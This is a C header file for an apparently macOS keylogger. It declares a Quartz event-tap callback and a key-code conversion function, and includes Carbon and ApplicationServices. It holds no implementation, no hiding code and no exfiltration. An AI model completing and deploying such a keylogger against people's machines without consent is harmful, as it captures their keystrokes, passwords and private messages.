#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

static inline CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
static inline const char *convertKeyCode(int);

#endif
